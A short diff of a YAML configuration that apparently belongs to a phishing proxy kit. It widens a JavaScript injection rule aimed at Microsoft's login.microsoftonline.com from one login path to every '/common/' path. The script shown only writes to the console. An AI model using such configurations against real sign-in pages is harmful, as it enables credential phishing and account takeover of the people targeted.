@@ -108,7 +108,7 @@ force_post:
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/common/login"]
+    trigger_paths: ["/common/*"]
     script: |
       function lp2() { 
         console.log("Yeah")
